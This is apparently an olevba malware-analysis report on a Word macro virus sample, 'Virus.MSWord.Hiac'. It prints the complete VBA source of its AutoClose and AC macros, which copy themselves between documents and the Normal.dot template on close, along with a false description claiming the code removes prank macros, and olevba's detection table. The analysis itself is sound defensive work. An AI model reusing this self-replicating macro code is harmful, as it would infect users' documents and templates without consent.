olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hiac-903d89b9e344af49dc67fbb66596d355764f8ae7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hiac-903d89b9e344af49dc67fbb66596d355764f8ae7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Hiac-903d89b9e344af49dc67fbb66596d355764f8ae7 - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim cfn$
Dim ac$
Dim Infect
Dim hi$
    cfn$ = WordBasic.[FileName$]()
    ac$ = WordBasic.[MacroFileName$]("AutoClose")
    If (ac$ = "") Or (InStr(LCase(ac$), "normal.dot") <> 0) Then Infect = 1
    hi$ = WordBasic.[MacroFileName$]("Hi")
    If (hi$ = "") Or (InStr(LCase(hi$), "normal.dot") <> 0) Then Infect = 1
    If Infect Then
        WordBasic.MacroCopy cfn$ + ":AC", "Global:AutoClose"
        WordBasic.MacroCopy cfn$ + ":AutoClose", "Global:Hi"
        WordBasic.FileSaveAll 1
    End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO ac.bas 
in file: Virus.MSWord.Hiac-903d89b9e344af49dc67fbb66596d355764f8ae7 - OLE stream: 'Macros/VBA/AC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AC.MAIN"
Dim cfn$
Dim ac$
Dim Infect
Dim hi$
    cfn$ = WordBasic.[FileName$]()
    ac$ = WordBasic.[MacroFileName$]("AutoClose")
    If (ac$ = "") Or (InStr(LCase(ac$), LCase(cfn$)) = 0) Then Infect = 1
    hi$ = WordBasic.[MacroFileName$]("Hi")
    If (hi$ = "") Or (InStr(LCase(hi$), LCase(cfn$)) = 0) Then Infect = 1
    If Infect Then
        WordBasic.MacroCopy "Global:AutoClose", cfn$ + ":AC"
        WordBasic.MacroCopy "Global:Hi", cfn$ + ":AutoClose"
        WordBasic.FileSaveAll 1
    End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

